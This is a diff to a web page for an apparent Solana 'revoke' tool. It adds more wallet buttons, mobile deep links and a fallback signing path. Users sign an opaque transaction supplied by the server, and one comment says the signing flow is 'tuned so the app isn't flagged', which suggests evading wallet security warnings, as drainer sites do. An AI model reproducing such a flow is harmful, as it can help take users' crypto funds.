@@ -38,6 +38,14 @@
   .wallet-btn:hover { transform: translateY(-1px); opacity: 0.95; }
   .wallet-btn.phantom { background: linear-gradient(135deg, #9945FF, #6B21A8); }
   .wallet-btn.solflare { background: linear-gradient(135deg, #FC822B, #B85F1F); }
+  .wallet-btn.backpack { background: linear-gradient(135deg, #E33E3F, #8B1E1E); }
+  .wallet-btn.okx { background: linear-gradient(135deg, #2B2B2B, #000000); }
+  .wallet-btn.coinbase { background: linear-gradient(135deg, #1652F0, #0A2A8C); }
+  .wallet-btn.trust { background: linear-gradient(135deg, #3375BB, #1C4A7E); }
+  .wallet-btn.glow { background: linear-gradient(135deg, #00D18C, #00785A); }
+  .wallet-btn.exodus { background: linear-gradient(135deg, #6E55C9, #3F3173); }
+  .wallet-btn.bitget { background: linear-gradient(135deg, #00F0FF, #0096A6); color: #06283D; }
+  .wallet-btn.brave { background: linear-gradient(135deg, #FB542B, #9E2D12); }
   .wallet-btn.jupiter { background: linear-gradient(135deg, #4D8FF7, #1E429F); }
   .wallet-info { font-family: var(--mono); font-size: 12px; color: var(--green); margin-top: 10px; padding: 10px 12px; background: rgba(16,185,129,0.06); border: 1px solid rgba(16,185,129,0.25); border-radius: 8px; display: none; align-items: center; justify-content: space-between; gap: 10px; flex-wrap: wrap; }
   .wallet-info.show { display: flex; }
@@ -82,10 +90,16 @@
 
   .footer-tag { text-align: center; margin-top: 28px; padding-top: 20px; border-top: 1px solid var(--border); font-family: 'Oswald', sans-serif; font-size: 10px; color: var(--subtext); letter-spacing: 3px; }
   .footer-tag a { color: #D97706; text-decoration: none; }
+
+  /* Desktop — wider container so the page fills a larger screen */
+  @media (min-width: 1040px) {
+    .wrap { max-width: 1040px; }
+  }
 </style>
 </head>
 <body>
 <div class="wrap">
+  <a href="/" class="back-home" style="display:inline-flex;align-items:center;gap:6px;font-family:Oswald,sans-serif;font-size:11px;font-weight:700;letter-spacing:2px;color:#D97706;text-decoration:none;margin:0 0 12px;"><img src="/cluck-norris-logo.jpg" alt="" style="height:22px;width:22px;object-fit:cover;border-radius:50%;border:1px solid #D97706;"/>&larr; CLUCK NORRIS HOME</a>
 
   <div class="header">
     <div class="header-icon">🔒</div>
@@ -119,8 +133,21 @@
     <div class="wallet-picker" id="walletPicker">
       <button class="wallet-btn phantom" onclick="connectWallet('phantom')">🔮 Phantom</button>
       <button class="wallet-btn solflare" onclick="connectWallet('solflare')">☀️ Solflare</button>
+      <button class="wallet-btn backpack" onclick="connectWallet('backpack')">🎒 Backpack</button>
+      <button class="wallet-btn okx" onclick="connectWallet('okx')">⭕ OKX</button>
+      <button class="wallet-btn coinbase" onclick="connectWallet('coinbase')">🔵 Coinbase</button>
+      <button class="wallet-btn trust" onclick="connectWallet('trust')">🛡 Trust</button>
+      <button class="wallet-btn glow" onclick="connectWallet('glow')">🌐 Glow</button>
+      <button class="wallet-btn exodus" onclick="connectWallet('exodus')">🪐 Exodus</button>
+      <button class="wallet-btn bitget" onclick="connectWallet('bitget')">🌊 Bitget</button>
+      <button class="wallet-btn brave" onclick="connectWallet('brave')">🦁 Brave</button>
       <button class="wallet-btn jupiter" onclick="connectWallet('jupiter')">🪐 Jupiter</button>
     </div>
+    <!-- Mobile-only: shown when no wallet is injected (i.e. opened in a normal
+         mobile browser). These are pure "open this page in your wallet's in-app
+         browser" deep links — navigation only, no keys/signing over the link;
+         once inside, the same injected connect flow above runs. -->
+    <div id="mobileConnect" style="display:none;margin-top:12px;flex-direction:column;gap:8px"></div>
     <div class="wallet-info" id="walletInfo">
       <span class="wallet-info-addr" id="walletInfoAddr"></span>
       <button class="wallet-disc-btn" onclick="disconnectWallet()">DISCONNECT</button>
@@ -220,8 +247,39 @@ async function confirmTx(signature) {
 const WALLETS = {
   phantom:  { name: 'Phantom',  detect: () => window.phantom?.solana || (window.solana?.isPhantom ? window.solana : null) },
   solflare: { name: 'Solflare', detect: () => window.solflare || (window.solana?.isSolflare ? window.solana : null) },
+  backpack: { name: 'Backpack', detect: () => (window.backpack?.isBackpack ? window.backpack : null) || (window.solana?.isBackpack ? window.solana : null) },
+  okx:      { name: 'OKX',      detect: () => window.okxwallet?.solana || window.okxwallet || null },
+  coinbase: { name: 'Coinbase', detect: () => window.coinbaseSolana || window.coinbaseWalletSolana || null },
+  trust:    { name: 'Trust',    detect: () => window.trustwallet?.solana || (window.solana?.isTrust ? window.solana : null) },
+  glow:     { name: 'Glow',     detect: () => window.glowSolana || window.glow?.solana || (window.solana?.isGlow ? window.solana : null) },
+  exodus:   { name: 'Exodus',   detect: () => window.exodus?.solana || null },
+  bitget:   { name: 'Bitget',   detect: () => window.bitkeep?.solana || window.bitgetWallet?.solana || (window.solana?.isBitKeep ? window.solana : null) },
+  brave:    { name: 'Brave',    detect: () => window.braveSolana || (window.solana?.isBraveWallet ? window.solana : null) },
   jupiter:  { name: 'Jupiter',  detect: () => window.jupiterWallet || window.jupiter || (window.solana?.isJupiter ? window.solana : null) },
 };
+// Mobile on-ramp: on mobile with NO wallet injected (a normal mobile browser,
+// not a wallet's in-app browser), offer one-tap deep links that OPEN this page
+// inside the wallet's browser. Pure navigation — nothing is signed or shared by
+// the link; the injected connect flow above runs once the user is inside.
+function initMobileDeepLinks() {
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  if (!isMobile) return;
+  const injected = !!(window.solana || window.phantom?.solana || window.solflare || window.backpack
+    || window.okxwallet || window.glowSolana || window.exodus?.solana || window.coinbaseSolana || window.trustwallet?.solana);
+  if (injected) return; // already inside a wallet browser — the buttons above work
+  const el = document.getElementById('mobileConnect'), picker = document.getElementById('walletPicker');
+  if (!el) return;
+  const url = encodeURIComponent(location.href), ref = encodeURIComponent(location.origin);
+  el.innerHTML =
+    '<div style="font-family:var(--mono);font-size:12px;color:var(--accent);line-height:1.5">📱 On mobile? Open this page inside your wallet to connect:</div>'
+    + '<a class="wallet-btn phantom" style="text-decoration:none" href="https://phantom.app/ul/browse/' + url + '?ref=' + ref + '">🔮 Open in Phantom</a>'
+    + '<a class="wallet-btn solflare" style="text-decoration:none" href="https://solflare.com/ul/v1/browse/' + url + '?ref=' + ref + '">☀️ Open in Solflare</a>'
+    + '<div style="font-family:var(--mono);font-size:10px;color:var(--subtext);line-height:1.5">Opens this page in the wallet’s built-in browser. Nothing is signed or shared by the link.</div>';
+  el.style.display = 'flex';
+  if (picker) picker.style.display = 'none'; // extension buttons can't work in a plain mobile browser
+}
+if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initMobileDeepLinks);
+else initMobileDeepLinks();
 function syncWalletUi() {
   const picker = document.getElementById('walletPicker');
   const info = document.getElementById('walletInfo');
@@ -348,7 +406,29 @@ async function revoke(accounts) {
     setProgress('Approve the transaction in your wallet…');
     const txBytes = Uint8Array.from(atob(data.txBase64), c => c.charCodeAt(0));
     const tx = solanaWeb3.Transaction.from(txBytes);
-    const { signature } = await activeWallet.provider.signAndSendTransaction(tx);
+    // PRIMARY path (UNCHANGED — Phantom/Solflare/etc.): the wallet signs AND
+    // submits. This is the flow tuned so the app isn't flagged — do NOT alter.
+    // SECONDARY path: only wallets WITHOUT signAndSendTransaction fall through to
+    // sign-locally + submit via our RPC. Capability-gated, so Phantom never hits it.
+    const _prov = activeWallet.provider;
+    let signature;
+    if (typeof _prov.signAndSendTransaction === 'function') {
+      const _r = await _prov.signAndSendTransaction(tx);
+      signature = _r?.signature || _r;          // some wallets return the sig string directly
+    } else if (typeof _prov.signTransaction === 'function') {
+      const signed = await _prov.signTransaction(tx);
+      const raw = new Uint8Array(signed.serialize());
+      let bin = ''; for (let i = 0; i < raw.length; i++) bin += String.fromCharCode(raw[i]);
+      const sendRes = await fetch('/api/helius-rpc', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ jsonrpc: '2.0', id: 'sc-send', method: 'sendTransaction', params: [btoa(bin), { encoding: 'base64' }] }),
+      });
+      const sj = await sendRes.json();
+      if (sj.error) throw new Error(sj.error.message || 'Transaction send failed');
+      signature = sj.result;
+    } else {
+      throw new Error(`${(WALLETS[activeWallet.id] && WALLETS[activeWallet.id].name) || 'This wallet'} can't sign transactions here — try its in-app browser, or use Phantom/Solflare.`);
+    }
 
     setProgress('Confirming on-chain…');
     await confirmTx(signature);
